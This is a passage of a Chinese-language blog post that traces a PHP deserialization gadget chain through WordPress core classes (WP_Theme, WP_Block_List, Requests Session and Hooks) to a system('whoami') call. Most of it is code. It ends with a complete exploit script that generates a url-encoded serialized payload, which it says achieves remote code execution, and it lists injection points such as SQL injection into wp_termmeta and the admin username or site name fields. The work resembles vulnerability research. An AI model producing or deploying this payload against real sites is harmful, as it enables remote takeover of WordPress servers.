class="variable">$available_context</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里构造方法的$registry参数可控，并且关键点中的$this-&gt;name也可控，因此这里选择将$registry设置成WP_Block_Type_Registry 扩展类的实例，通过调用其get_registered方法来衔接链</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207002356.png"></p>
<p><strong>第五步</strong>：</p>
<p>进入wp-includes&#x2F;class-wp-block-type-registry.php的get_registered方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_registered</span>(<span class="params"> <span class="variable">$name</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">is_registered</span>( <span class="variable">$name</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 关键点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;registered_block_types[ <span class="variable">$name</span> ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要到达关键点，首先需要不满足if条件：! $this-&gt;is_registered( $name )，即对应的$name已注册</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> function <span class="title function_">is_registered</span><span class="params">( $name )</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> isset( $<span class="built_in">this</span>-&gt;registered_block_types[ $name ] );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在关键点处，同样的道理，$this-&gt;registered_block_types为实现ArrayAccess接口的类实例，这样在取$name时能够调用offsetGet方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207003829.png"></p>
<p>这里将$this-&gt;registered_block_types设置为WP_Theme实例，WP_Theme类同样也继承ArrayAccess接口</p>
<p><strong>第六步</strong>：</p>
<p>进入wp-includes&#x2F;class-wp-theme.php的offsetGet方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"> <span class="variable">$offset</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="variable">$offset</span> ) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Name&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Title&#x27;</span>:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">				 * See note above about using translated data. get() is not ideal.</span></span><br><span class="line"><span class="comment">				 * It is only for backward compatibility. Use display().</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="string">&#x27;Name&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Author&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Author&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Author Name&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Author&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Author URI&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;AuthorURI&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Description&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="string">&#x27;Description&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Version&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Status&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="variable">$offset</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Template&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_template</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Stylesheet&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_stylesheet</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Template Files&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_files</span>( <span class="string">&#x27;php&#x27;</span>, <span class="number">1</span>, <span class="literal">true</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Stylesheet Files&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_files</span>( <span class="string">&#x27;css&#x27;</span>, <span class="number">0</span>, <span class="literal">false</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Template Dir&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_template_directory</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Stylesheet Dir&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_stylesheet_directory</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Screenshot&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_screenshot</span>( <span class="string">&#x27;relative&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Tags&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>( <span class="string">&#x27;Tags&#x27;</span> );</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Theme Root&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_theme_root</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Theme Root URI&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_theme_root_uri</span>();</span><br><span class="line">        <span class="comment">// 关键点</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Parent Theme&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>() ? <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>()-&gt;<span class="title function_ invoke__">get</span>( <span class="string">&#x27;Name&#x27;</span> ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$offset参数可控，这里将其设置为’Parent Theme’，查看$this-&gt;parent()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>( <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> ) ? <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回parent属性，$this-&gt;parent同样可控，可以将其设置为一个包含get方法的类实例，这里选择Session实例</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207114947.png"></p>
<p><strong>第七步</strong>：</p>
<p>进入wp-includes&#x2F;Requests&#x2F;src&#x2F;Session.php的get方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span> = [], <span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="literal">null</span>, <span class="title class_">Requests</span>::<span class="variable constant_">GET</span>, <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的$url依旧是字符串Name，进入本类的request方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span> = [], <span class="variable">$data</span> = [], <span class="variable">$type</span> = <span class="title class_">Requests</span>::<span class="variable constant_">GET</span>, <span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 合并成一个request请求</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">merge_request</span>(<span class="title function_ invoke__">compact</span>(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;options&#x27;</span>));</span><br><span class="line">	<span class="comment">// 使用静态方法发起一个请求</span></span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Requests</span>::<span class="title function_ invoke__">request</span>(<span class="variable">$request</span>[<span class="string">&#x27;url&#x27;</span>], <span class="variable">$request</span>[<span class="string">&#x27;headers&#x27;</span>], <span class="variable">$request</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$type</span>, <span class="variable">$request</span>[<span class="string">&#x27;options&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入request方法的参数都可控</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207122634.png"></p>
<p><strong>第八步</strong>：</p>
<p>进入wp-includes&#x2F;Requests&#x2F;src&#x2F;Requests.php的request方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span> = [], <span class="variable">$data</span> = [], <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">GET</span>, <span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">InputValidator</span>::<span class="title function_ invoke__">is_string_or_stringable</span>(<span class="variable">$url</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">1</span>, <span class="string">&#x27;$url&#x27;</span>, <span class="string">&#x27;string|Stringable&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$url</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$type</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">4</span>, <span class="string">&#x27;$type&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$type</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">5</span>, <span class="string">&#x27;$options&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$options</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;type&#x27;</span>] = <span class="variable">$type</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$options</span> = <span class="title function_ invoke__">array_merge</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">get_default_options</span>(), <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">self</span>::<span class="title function_ invoke__">set_defaults</span>(<span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$data</span>, <span class="variable">$type</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用请求钩子（hooks）触发requests.before_parse事件,允许用户在解析响应之前对响应进行自定义操作</span></span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;hooks&#x27;</span>]-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="string">&#x27;requests.before_request&#x27;</span>, [&amp;<span class="variable">$url</span>, &amp;<span class="variable">$headers</span>, &amp;<span class="variable">$data</span>, &amp;<span class="variable">$type</span>, &amp;<span class="variable">$options</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$options变量可控，需要寻找一个包含dispatch方法的类，选择Hooks实例</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207123710.png"></p>
<p><strong>第九步</strong>：</p>
<p>进入wp-includes&#x2F;Requests&#x2F;src&#x2F;Hooks.php的dispatch方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params"><span class="variable">$hook</span>, <span class="variable">$parameters</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$hook</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">1</span>, <span class="string">&#x27;$hook&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$hook</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check strictly against array, as Array* objects don&#x27;t work in combination with `call_user_func_array()`.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$parameters</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">2</span>, <span class="string">&#x27;$parameters&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$parameters</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hooks[<span class="variable">$hook</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parameters</span>)) &#123;</span><br><span class="line">        <span class="comment">// Strip potential keys from the array to prevent them being interpreted as parameter names in PHP 8.0.</span></span><br><span class="line">        <span class="variable">$parameters</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$parameters</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ksort</span>(<span class="variable">$this</span>-&gt;hooks[<span class="variable">$hook</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键部分</span></span><br><span class="line">    <span class="comment">// 通过两层循环，遍历钩子列表中的每个回调函数。外层循环按照优先级顺序遍历，内层循环遍历每个优先级下的回调函数。</span></span><br><span class="line">    <span class="comment">// 在内层循环中，通过调用 $callback(...$parameters) 执行回调函数。使用可变长度参数语法将 $parameters 数组中的元素作为参数传递给回调函数。</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hooks[<span class="variable">$hook</span>] <span class="keyword">as</span> <span class="variable">$priority</span> =&gt; <span class="variable">$hooked</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$hooked</span> <span class="keyword">as</span> <span class="variable">$callback</span>) &#123;</span><br><span class="line">            <span class="variable">$callback</span>(...<span class="variable">$parameters</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法的作用是触发指定钩子事件，并按照优先级顺序执行与之关联的回调函数。它通过遍历钩子列表中的回调函数，并将参数传递给每个回调函数来实现这一目的。这种机制允许开发者在特定的时机插入自定义逻辑，扩展和定制程序的功能。</p>
<p>这里的hooks和$parameters都可控，从而控制$callback回调函数和参数</p>
<p>第一次调用dispatch方法，即Requests.php中的request方法处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$options</span>[<span class="string">&#x27;hooks&#x27;</span>]-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="string">&#x27;requests.before_request&#x27;</span>, [&amp;<span class="variable">$url</span>, &amp;<span class="variable">$headers</span>, &amp;<span class="variable">$data</span>, &amp;<span class="variable">$type</span>, &amp;<span class="variable">$options</span>]);</span><br></pre></td></tr></table></figure>

<p>所构成的回调函数$this-&gt;hooks[“requests.before_request”][0][0]([&amp;$url, &amp;$headers, &amp;$data, &amp;$type, &amp;$options])</p>
<p>而$this-&gt;hooks[“requests.before_request”][0][0]为一个数组，第一个元素为Hooks实例，第二个元素为方法字符串”dispatch”，因此又回调至Hooks的dispatch方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207175419.png"></p>
<p>第二次调用dispatch方法，通过回调，由于dispatch方法只使用了两个参数，因此回调中的后三个参数不会使用，即$data、$type和$option</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">dispatch</span>(&amp;<span class="variable">$url</span>, &amp;<span class="variable">$headers</span>)</span><br></pre></td></tr></table></figure>

<p>此时的$this对应的是新Hooks实例，$hook参数对应的是$url，而$this-&gt;hooks数组中存在以$url为键的值，是一个数组，里面第一个元素为system字符串</p>
<p>而$parameters对应的是$header，是一个数组，里面存放whoami字符串，从而构成回调方法：system([“whoami”])</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207214140.png"></p>
<p>最后成功RCE</p>
<h1 id="尝试编写EXP"><a href="#尝试编写EXP" class="headerlink" title="尝试编写EXP"></a>尝试编写EXP</h1><p>根据实现的整体流程，尝试动手编写EXP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">WpOrg</span>\<span class="title class_">Requests</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Session</span> &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">url</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$headers</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers = <span class="variable">$headers</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = <span class="variable">$options</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hooks</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hooks</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hooks</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hooks = <span class="variable">$hooks</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">WpOrg</span>\<span class="title class_">Requests</span>\<span class="title class_">Hooks</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">WpOrg</span>\<span class="title">Requests</span>\<span class="title">Session</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WP_Theme</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$headers</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$headers</span>, <span class="variable">$parent</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers = <span class="variable">$headers</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$parent</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WP_Block_List</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$blocks</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$registry</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$blocks</span>, <span class="variable">$registry</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;blocks = <span class="variable">$blocks</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;registry = <span class="variable">$registry</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WP_Block_Type_Registry</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$registered_block_types</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$registered_block_types</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;registered_block_types = <span class="variable">$registered_block_types</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$hooks</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;requests.before_request&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="comment">// $hooked</span></span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">            <span class="comment">// $callback</span></span><br><span class="line">                <span class="keyword">array</span> (</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Hooks</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&quot;http://p:0/Name&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                            <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">                        )</span><br><span class="line">                        )</span><br><span class="line">                    ),</span><br><span class="line">                    <span class="string">&quot;dispatch&quot;</span></span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要设置hooks属性</span></span><br><span class="line">    <span class="variable">$hook</span> = <span class="keyword">new</span> <span class="title class_">Hooks</span>(<span class="variable">$hooks</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// headers对应的最后执行的命令数组</span></span><br><span class="line">    <span class="comment">// options中有一个hooks键，需要设置成Hooks实例</span></span><br><span class="line">    <span class="variable">$parent</span> = <span class="keyword">new</span> <span class="title class_">Session</span>(<span class="string">&quot;http://p:0&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;hooks&quot;</span> =&gt; <span class="variable">$hook</span>) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要设置parent属性为Session实例</span></span><br><span class="line">    <span class="variable">$registered_block_types</span> = <span class="keyword">new</span> <span class="title class_">WP_Theme</span>(<span class="literal">null</span>, <span class="variable">$parent</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在WP_Theme中根据offsetGet方法来设置</span></span><br><span class="line">    <span class="variable">$block</span> = [<span class="string">&quot;blockName&quot;</span> =&gt; <span class="string">&quot;Parent Theme&quot;</span>];</span><br><span class="line">    <span class="variable">$blocks</span> = [<span class="string">&quot;Name&quot;</span> =&gt; <span class="variable">$block</span>];</span><br><span class="line">    <span class="comment">// 需要设置registered_block_types属性，同样为继承ArrayAccess接口的实例，即WP_Theme</span></span><br><span class="line">    <span class="variable">$registry</span> = <span class="keyword">new</span> <span class="title class_">WP_Block_Type_Registry</span>(<span class="variable">$registered_block_types</span>);</span><br><span class="line">    <span class="comment">// 需要设置blocks属性，含有“Name”键，为数组</span></span><br><span class="line">    <span class="comment">// 需要设置registry属性为WP_Block_Type_Registry对象</span></span><br><span class="line">    <span class="variable">$headers</span> = <span class="keyword">new</span> <span class="title class_">WP_Block_List</span>(<span class="variable">$blocks</span>, <span class="variable">$registry</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// WP_Theme中的get方法，需要设置$header属性为继承ArrayAccess接口的实例，即WP_Block_List</span></span><br><span class="line">    <span class="comment">// 触发__toString方法的对象</span></span><br><span class="line">    <span class="variable">$theme</span> = <span class="keyword">new</span> <span class="title class_">WP_Theme</span>(<span class="variable">$headers</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$theme</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成的payload能够成功RCE</p>
<h1 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h1><p>首先需要找到反序列化点，在wordpress中存在该方法maybe_unserialize会对传入的数据进行反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maybe_unserialize</span>(<span class="params"> <span class="variable">$data</span> </span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="title function_ invoke__">is_serialized</span>( <span class="variable">$data</span> ) ) &#123; <span class="comment">// Don&#x27;t attempt to unserialize data that wasn&#x27;t serialized going in.</span></span><br><span class="line">		<span class="keyword">return</span> @<span class="title function_ invoke__">unserialize</span>( <span class="title function_ invoke__">trim</span>( <span class="variable">$data</span> ) );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而调用该方法的在整个项目中存在20项</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207235734.png"></p>
<p><strong>payload</strong>注入点：</p>
<p>一般而言通过SQL注入漏洞往数据库中写入恶意的payload能够到达这一效果，在wpscan的报告中提到，存在SQL注入漏洞会在 wp_termmeta 表中插入新行，插入的元数据在检索时会经过 maybe_unserialize，从而造成RCE</p>
<p>其实管理员用户名处、站点名等设置成恶意payload都可以导致RCE</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/">Finding A RCE Gadget Chain In WordPress Core | WPScan</a></p>
<p><a href="https://github.com/ambionics/phpggc">ambionics&#x2F;phpggc: PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. (github.com)</a></p>
<p><a href="https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/">Gadgets chain in Wordpress (fenrisk.com)</a></p>
